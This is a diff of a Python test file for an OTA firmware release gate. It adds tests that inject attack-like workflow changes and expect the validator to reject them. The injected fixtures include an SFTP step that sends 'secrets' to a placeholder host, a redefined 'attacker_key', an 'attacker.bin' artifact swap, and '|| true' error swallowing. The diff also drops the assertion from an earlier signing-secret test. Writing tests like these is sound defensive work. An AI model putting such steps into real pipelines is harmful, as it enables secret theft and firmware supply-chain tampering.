@@ -351,7 +351,86 @@ class OtaContractGateTest(unittest.TestCase):
         "OTA_SIGNING_PUBLIC_KEY_HEX: ${{ secrets.OTA_SIGNING_PUBLIC_KEY_HEX }}",
         "OTA_SIGNING_PUBLIC_KEY_HEX: ${{ secrets.SOME_OTHER_KEY }}",
     )
-    with self.assertRaisesRegex(gate.GateError, "production signing secret"):
+  def test_evidence_step_continue_on_error_is_rejected(self):
+    workflows = self._workflow_sources()
+    target_workflow = ".github/workflows/deploy.yml"
+    workflows[target_workflow] = workflows[target_workflow].replace(
+        "      - name: Enforce OTA production release evidence\n",
+        "      - name: Enforce OTA production release evidence\n        continue-on-error: true\n",
+    )
+    with self.assertRaisesRegex(gate.GateError, "continue-on-error"):
+      gate.validate_workflow_release_triggers(workflows)
+
+  def test_release_command_error_swallowing_is_rejected(self):
+    workflows = self._workflow_sources()
+    target_workflow = ".github/workflows/deploy.yml"
+    workflows[target_workflow] = workflows[target_workflow].replace(
+        '--public-key-hex "$OTA_SIGNING_PUBLIC_KEY_HEX"',
+        '--public-key-hex "$OTA_SIGNING_PUBLIC_KEY_HEX" || true',
+    )
+    with self.assertRaisesRegex(gate.GateError, "swallow errors"):
+      gate.validate_workflow_release_triggers(workflows)
+
+  def test_signing_key_redefinition_in_run_script_is_rejected(self):
+    workflows = self._workflow_sources()
+    target_workflow = ".github/workflows/deploy.yml"
+    workflows[target_workflow] = workflows[target_workflow].replace(
+        "        run: |\n",
+        "        run: |\n          OTA_SIGNING_PUBLIC_KEY_HEX=attacker_key\n",
+    )
+    with self.assertRaisesRegex(gate.GateError, "redefined in run script"):
+      gate.validate_workflow_release_triggers(workflows)
+
+  def test_same_step_artifact_mutation_after_validation_is_rejected(self):
+    workflows = self._workflow_sources()
+    target_workflow = ".github/workflows/deploy.yml"
+    workflows[target_workflow] = workflows[target_workflow].replace(
+        '--public-key-hex "$OTA_SIGNING_PUBLIC_KEY_HEX"',
+        '--public-key-hex "$OTA_SIGNING_PUBLIC_KEY_HEX"\n          cp attacker.bin dist/gatekeeper-firmware.bin',
+    )
+    with self.assertRaisesRegex(gate.GateError, "alter artifacts after validation"):
+      gate.validate_workflow_release_triggers(workflows)
+
+  def test_sftp_local_path_rebinding_is_rejected(self):
+    workflows = self._workflow_sources()
+    target_workflow = ".github/workflows/deploy.yml"
+    workflows[target_workflow] = workflows[target_workflow].replace(
+        "local_path: './dist/*'",
+        "local_path: './unbound/*'",
+    )
+    with self.assertRaisesRegex(gate.GateError, "local_path must be strictly"):
+      gate.validate_workflow_release_triggers(workflows)
+
+  def test_duplicate_or_early_sftp_is_rejected(self):
+    workflows = self._workflow_sources()
+    target_workflow = ".github/workflows/deploy.yml"
+    workflows[target_workflow] = workflows[target_workflow].replace(
+        "      - name: Enforce OTA production release evidence\n",
+        "      - name: Early SFTP\n        uses: wlixcc/SFTP-Deploy-Action@v1.2.4\n      - name: Enforce OTA production release evidence\n",
+    )
+    with self.assertRaisesRegex(gate.GateError, "exactly one SFTP deploy step"):
+      gate.validate_workflow_release_triggers(workflows)
+
+
+  def test_object_form_build_environment_is_rejected(self):
+    workflows = self._workflow_sources()
+    target_workflow = ".github/workflows/deploy.yml"
+    workflows[target_workflow] = workflows[target_workflow].replace(
+        "    name: Test and build firmware canary\n",
+        "    name: Test and build firmware canary\n    environment:\n      name: production\n",
+    )
+    with self.assertRaisesRegex(gate.GateError, "must not use production environment|must not specify environment"):
+      gate.validate_workflow_release_triggers(workflows)
+
+
+  def test_ordinary_build_shell_sftp_command_is_rejected(self):
+    workflows = self._workflow_sources()
+    target_workflow = ".github/workflows/deploy.yml"
+    workflows[target_workflow] = workflows[target_workflow].replace(
+        "    steps:\n",
+        "    steps:\n      - name: Shell SFTP exfiltration\n        run: sftp user@host <<< 'put secrets'\n",
+    )
+    with self.assertRaisesRegex(gate.GateError, "production or SFTP deployment capability"):
       gate.validate_workflow_release_triggers(workflows)
 
 
